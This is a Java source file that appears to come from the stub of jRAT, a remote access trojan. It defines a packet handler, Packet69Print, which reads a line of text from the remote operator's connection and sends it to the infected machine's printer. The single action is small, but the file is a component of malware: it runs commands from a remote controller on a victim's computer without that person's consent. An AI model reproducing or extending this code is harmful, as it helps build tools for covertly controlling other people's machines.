package su.jrat.stub.packets.incoming;

import javax.swing.JTextPane;

import su.jrat.stub.Connection;


public class Packet69Print extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String toprint = Connection.readLine();
		JTextPane c = new JTextPane();
		c.setText(toprint);
		c.print();
	}

}